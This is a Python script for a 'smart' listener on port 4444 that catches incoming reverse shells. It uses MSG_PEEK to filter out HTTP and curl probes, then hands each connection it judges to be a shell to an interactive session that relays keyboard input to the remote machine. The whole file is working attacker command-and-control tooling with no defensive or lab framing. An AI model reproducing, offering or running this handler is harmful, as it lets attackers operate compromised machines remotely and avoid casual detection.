import socket
import sys
import threading
import time

def send_loop(client_socket):
    try:
        while True:
            line = sys.stdin.readline()
            if not line:
                break
            client_socket.sendall(line.encode())
    except (socket.error, KeyboardInterrupt):
        pass

def handle_interaction(client_socket):
    print("[+] Entering interactive shell session. Press Ctrl+C to exit.")
    client_socket.setblocking(1)
    
    input_thread = threading.Thread(target=send_loop, args=(client_socket,))
    input_thread.daemon = True
    input_thread.start()
    
    try:
        while True:
            data = client_socket.recv(4096)
            if not data:
                print("[-] Client disconnected.")
                break
            sys.stdout.buffer.write(data)
            sys.stdout.flush()
    except KeyboardInterrupt:
        print("\n[*] Session terminated by user.")
    except socket.error as e:
        print(f"\n[-] Network error during session: {e}")

def start_smart_listener(host='0.0.0.0', port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    
    print(f"[*] Smart listener started, listening on {host}:{port} ...")
    
    try:
        while True:
            client_sock, client_addr = server.accept()
            print(f"\n[+] Connection received from {client_addr}, analyzing traffic...")
            
            client_sock.setblocking(0)
            time.sleep(0.5)
            
            is_valid_shell = True
            try:
                peek_data = client_sock.recv(1024, socket.MSG_PEEK)
                if len(peek_data) > 0:
                    if (b"GET " in peek_data or 
                        b"POST " in peek_data or 
                        b"User-Agent" in peek_data or 
                        b"HTTP/" in peek_data or 
                        b"HEAD " in peek_data or 
                        b"OPTIONS " in peek_data):
                        print("[-] Match found: HTTP/curl traffic detected. Connection rejected.")
                        is_valid_shell = False
                    else:
                        print(f"[+] Match found: Active data detected ({len(peek_data)} bytes). Proceeding...")
                else:
                    print("[+] Traffic signature: Remote host is SILENT. Identified as standard Interactive Shell.")
            except socket.error:
                print("[+] Traffic signature: Socket blocked (no active data). Identified as standard Interactive Shell.")
            
            if is_valid_shell:
                handle_interaction(client_sock)
            
            try:
                client_sock.close()
            except:
                pass
            print("[*] Returning to main loop, awaiting next connection...")
                
    except KeyboardInterrupt:
        print("\n[*] Listener server stopped.")
    finally:
        server.close()

if __name__ == "__main__":
    start_smart_listener()